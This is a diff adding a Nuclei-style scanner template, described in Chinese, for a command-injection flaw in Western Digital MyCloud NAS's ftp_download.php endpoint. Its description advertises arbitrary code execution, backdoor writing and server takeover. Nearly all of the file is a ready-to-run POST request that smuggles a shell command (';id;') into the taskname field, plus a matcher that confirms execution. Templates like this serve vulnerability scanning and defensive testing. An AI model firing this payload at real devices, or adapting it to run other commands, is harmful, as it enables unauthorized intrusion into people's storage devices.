@@ -1,0 +1,39 @@
+id: wd-cloud-ftp_download-rce
+info:
+  name: 西部数码 NAS ftp_download.php 命令执行漏洞
+  author: leadlife
+  severity: critical
+  description: Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS ftp_download.php中存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/vf5nb80opzkzvupg
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: rce,wdcloud
+
+http:
+  - raw:
+      - |
+        POST /web/addons/ftp_download.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 96
+
+        action=create&taskname=";id;"&host=127.0.0.1&user=test&pwd=test&dest_dir=/tmp&schedule=0&lang=en
+        
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
